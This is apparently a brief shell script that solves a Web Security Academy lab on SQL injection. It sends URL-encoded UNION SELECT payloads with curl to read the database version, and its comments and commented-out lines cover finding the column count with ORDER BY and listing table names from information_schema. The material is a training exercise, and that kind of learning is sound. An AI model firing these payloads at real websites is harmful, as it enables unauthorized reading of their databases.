BASE_URL="https://0a56001404b0238f80430d9e00b400a2.web-security-academy.net"
ENDPOINT="/filter"

# The query returns two columns, server error generated for 3. So our query is returning two columns.
# NOTE the space after the --, which is required to comment out the rest of the query!
# QUERY="category=Gifts%27+ORDER+BY+2--+"

# For MS / MYSQL, the version is a single column (variable) @@VERSION, so we select @@VERSION,NULL to occupy 2 columns
QUERY="category=WhoCares%27+UNION+SELECT+%40%40VERSION%2CNULL--+"

# We can get table names, but this doesn't quite help us, we just need @@VERSION.
# QUERY="category=WhoCares%27+UNION+SELECT+TABLE_NAME%2CNULL+FROM+information_schema.tables--+"

out=$(curl "${BASE_URL}${ENDPOINT}?${QUERY}")
echo "$out"
